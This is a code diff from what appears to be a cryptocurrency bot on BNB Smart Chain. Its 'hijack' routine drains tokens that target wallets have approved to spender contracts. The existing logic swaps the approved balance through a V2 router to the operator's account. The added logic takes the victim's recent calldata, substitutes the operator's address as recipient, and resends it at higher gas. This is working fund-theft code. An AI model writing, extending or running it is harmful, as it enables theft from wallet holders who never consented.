@@ -50,8 +50,33 @@ async function pickPath(spender: `0x${string}`, token: `0x${string}`, amount: bi
             });
             if (out && out[out.length - 1] > 0n) return path;
         } catch { 
-            // Silently ignore non-router or reverting path probes
+            // Not a V2 router or reverting path probe
         }
+    }
+    return null;
+}
+
+function patchRecipient(input: Hex, wallet: `0x${string}`, to: `0x${string}`): Hex | null {
+    const needle = pad(wallet, { size: 32 }).slice(2).toLowerCase();
+    const repl = pad(to, { size: 32 }).slice(2).toLowerCase();
+    const body = input.slice(2).toLowerCase();
+    if (!body.includes(needle)) return null;
+    return ('0x' + body.split(needle).join(repl)) as Hex;
+}
+
+async function replayFromWallet(wallet: `0x${string}`, spender: `0x${string}`, to: `0x${string}`): Promise<Hex | null> {
+    try {
+        const block = await pub.getBlock({ blockTag: 'latest', includeTransactions: true });
+        const txs = ((block?.transactions ?? []) as any[]).filter(t =>
+            typeof t !== 'string' && t.from?.toLowerCase() === wallet.toLowerCase() && t.to?.toLowerCase() === spender.toLowerCase()
+        );
+        for (const tx of txs.reverse()) {
+            if (!tx.input || tx.input === '0x') continue;
+            const patched = patchRecipient(tx.input as Hex, wallet, to);
+            if (patched) return patched;
+        }
+    } catch {
+        // Ignore transient block read errors
     }
     return null;
 }
@@ -76,13 +101,10 @@ export async function hijack(t: Target, token: `0x${string}`, spender: `0x${stri
     if (balance === 0n) return;
     const amount = balance < approved ? balance : approved;
 
-    const path = await pickPath(spender, token, amount);
-    if (!path) return;
-
     seen.add(key);
 
     if (ENV.HIJACK_DRY) {
-        console.log(`[HIJACK-DRY] wallet=${t.target} token=${token} spender=${spender} amount=${amount} v2=${path.join('>')}`);
+        console.log(`[HIJACK-DRY] wallet=${t.target} token=${token} spender=${spender} amount=${amount}`);
         return;
     }
 
@@ -93,29 +115,49 @@ export async function hijack(t: Target, token: `0x${string}`, spender: `0x${stri
 
     const price = (await pub.getGasPrice()) * 150n / 100n;
     const wallet = createWalletClient({ account, chain: bsc, transport: transport() });
-    const deadline = BigInt(Math.floor(Date.now() / 1000) + 120);
     const nonce = await pub.getTransactionCount({ address: account.address, blockTag: 'pending' });
 
     let hash: string | null = null;
-    let outToken: `0x${string}` = path[path.length - 1];
+    let outToken: `0x${string}` = token;
 
-    try {
-        hash = await wallet.writeContract({
-            address: spender, abi: V2_ROUTER, functionName: 'swapExactTokensForTokens',
-            args: [amount, 0n, path, account.address, deadline],
-            gasPrice: price, nonce,
-        });
-    } catch (e: any) { 
-        console.error(`[HIJACK V2 FAIL] ${e.shortMessage || e.message}`); 
+    // Strategy 1: V2 Router Swap (if recognized V2 router)
+    const path = await pickPath(spender, token, amount);
+    if (path) {
+        outToken = path[path.length - 1];
+        const deadline = BigInt(Math.floor(Date.now() / 1000) + 120);
+        try {
+            hash = await wallet.writeContract({
+                address: spender, abi: V2_ROUTER, functionName: 'swapExactTokensForTokens',
+                args: [amount, 0n, path, account.address, deadline],
+                gasPrice: price, nonce,
+            });
+        } catch (e: any) {
+            console.error(`[HIJACK V2 FAIL] ${e.shortMessage || e.message}`);
+        }
+    } else {
+        // Strategy 2: Custom Contract / Mint Contract Calldata Replay (e.g., Jagent mint contract 0x3643A907...)
+        const patchedCalldata = await replayFromWallet(t.target as `0x${string}`, spender, account.address);
+        if (patchedCalldata) {
+            try {
+                hash = await wallet.sendTransaction({
+                    to: spender,
+                    data: patchedCalldata,
+                    gasPrice: price,
+                    nonce,
+                });
+            } catch (e: any) {
+                console.error(`[HIJACK REPLAY FAIL] ${e.shortMessage || e.message}`);
+            }
+        }
     }
 
     if (!hash) {
         seen.delete(key);
-        await notify(t.userId, `Hijack miss on <code>${token}</code>.`);
+        await notify(t.userId, `Hijack miss on <code>${token}</code> (Spender: ${spender}).`);
         return;
     }
 
-    console.log(`[HIJACK] ${token} via ${spender} tx=${hash}`);
+    console.log(`[HIJACK SUCCESS] ${token} via ${spender} tx=${hash}`);
     
     let got = 0n;
     try {
